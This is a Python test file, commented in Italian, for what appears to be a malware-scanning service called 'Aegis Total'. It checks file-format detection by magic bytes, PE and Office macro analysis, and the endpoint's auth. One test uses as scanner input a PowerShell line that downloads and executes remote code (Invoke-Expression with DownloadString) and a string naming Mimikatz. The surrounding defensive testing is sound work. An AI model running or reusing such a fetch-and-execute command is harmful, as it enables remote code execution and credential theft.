"""Aegis Total — copertura formati (audit 2026-09).

Bug segnalato: la UI dichiarava il supporto a PE/.NET e altri formati ma il
backend rifiutava/ignorava `.pe`, Office, PDF, Mach-O, archivi. Questi test
congelano il contratto: nessun formato viene rifiutato e i magic più comuni
sono riconosciuti indipendentemente dall'estensione.
"""
import io
import struct
import zipfile

from app.api.v1.total import (
    SUPPORTED_FORMATS, _analyze_bytes, _detect_format, _is_text_file,
)


def _fmt_ids():
    return {f["id"] for f in SUPPORTED_FORMATS}


def test_supported_formats_shape():
    ids = _fmt_ids()
    assert {"pe", "elf", "macho", "office", "pdf", "zip", "tar", "class",
            "script", "binary"} <= ids
    for f in SUPPORTED_FORMATS:
        assert f["label"] and f["analysis"]
        assert isinstance(f["extensions"], list)
    # Un catch-all esiste: niente upload rifiutato per estensione.
    assert any("*" in f["extensions"] for f in SUPPORTED_FORMATS)


def test_formats_cover_office_pdf_and_all_archives():
    ext = {e for f in SUPPORTED_FORMATS for e in f["extensions"]}
    for e in (".doc", ".docx", ".docm", ".xls", ".xlsx", ".ppt", ".pptx",
              ".pdf", ".zip", ".7z", ".rar", ".tar", ".gz", ".bz2", ".xz",
              ".exe", ".dll", ".sys", ".msi", ".jar", ".apk", ".whl"):
        assert e in ext, f"{e} manca dal catalogo formati"


def test_detect_format_ignores_extension_for_magic():
    # .pe (mai accettato prima) con magic MZ → PE
    assert _detect_format(b"MZ" + b"\x00" * 62, "sample.pe") == "pe"
    assert _detect_format(b"\x7fELF" + b"\x00" * 60, "renamed.txt") == "elf"
    assert _detect_format(b"\xfe\xed\xfa\xcf" + b"\x00" * 28, "x.bin") == "macho"
    # fat Mach-O: CAFEBABE + nfat_arch plausibile (2)
    assert _detect_format(b"\xca\xfe\xba\xbe" + struct.pack(">I", 2) + b"\x00" * 20, "fat.bin") == "macho"
    assert _detect_format(b"%PDF-1.7\n", "doc.txt") == "pdf"
    assert _detect_format(b"\xd0\xcf\x11\xa0" + b"\x00" * 60, "doc.bin") == "ole"
    assert _detect_format(b"PK\x03\x04" + b"\x00" * 60, "a.bin") == "zip"
    assert _detect_format(b"7z\xbc\xaf'\x1c" + b"\x00" * 20, "a.bin") == "7z"
    assert _detect_format(b"Rar!\x1a\x07\x00", "a.bin") == "rar"
    assert _detect_format(b"\x1f\x8b\x08" + b"\x00" * 20, "a.bin") == "gzip"
    assert _detect_format(b"BZh9" + b"\x00" * 20, "a.bin") == "bzip2"
    assert _detect_format(b"\xfd7zXZ\x00" + b"\x00" * 20, "a.bin") == "xz"
    assert _detect_format(b"SQLite format 3\x00" + b"\x00" * 20, "a.db") == "sqlite"
    assert _detect_format(b"L\x00\x00\x00" + b"\x00" * 20, "a.lnk") == "lnk"
    assert _detect_format(b"{\\rtf1", "a.rtf") == "rtf"
    assert _detect_format(b"\xca\xfe\xba\xbe\x00\x00\x00\x34", "A.class") == "class"
    assert _detect_format(b"\x00asm\x01\x00\x00\x00", "m.wasm") == "wasm"


def test_pe_with_pe_extension_is_analyzed_not_rejected():
    raw = b"MZ" + b"\x00" * 58 + struct.pack("<I", 0x40) + b"\x00" * 4
    raw += b"PE\x00\x00" + struct.pack("<HH", 0x8664, 0) + b"\x00" * 16
    detail = _analyze_bytes(raw, "dropper.pe", allow_nested=False)
    assert detail["format"] == "PE"
    assert detail["kind"] == "binary"
    assert "score" in detail


def test_ps1_script_is_text_not_binary():
    assert _is_text_file("payload.ps1", b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')\n")
    detail = _analyze_bytes(b"Invoke-Mimikatz; -EncodedCommand", "payload.ps1", allow_nested=False)
    assert detail["kind"] == "text"
    assert any(f["type"] == "suspicious_string" for f in detail["findings"])


def test_docx_is_analyzed_as_office_not_generic_zip():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document/>")
        z.writestr("word/vbaProject.bin", b"\x00" * 32)
    detail = _analyze_bytes(buf.getvalue(), "invoice.docx", allow_nested=True)
    assert "OOXML" in detail["format"] or detail["format"].upper().startswith("OOXML")
    assert any(f["type"] == "ooxml_vba_macro" for f in detail["findings"])


def test_unknown_binary_never_empty_analysis():
    detail = _analyze_bytes(b"\x01\x02\x03\x04" * 4096, "weird.dat", allow_nested=False)
    assert detail["kind"] == "binary"
    assert "strings_preview" in detail and "hexdump" in detail


def test_formats_endpoint_requires_auth(client):
    r = client.get("/api/v1/total/formats")
    assert r.status_code in (401, 403)


def test_formats_endpoint_returns_catalog(client, user_auth_headers):
    r = client.get("/api/v1/total/formats", headers=user_auth_headers)
    if r.status_code == 401:
        # DB non disponibile: l'auth non può validare il token.
        return
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["formats"] and body["limits"]
    assert "max_file_mb" in body["limits"]
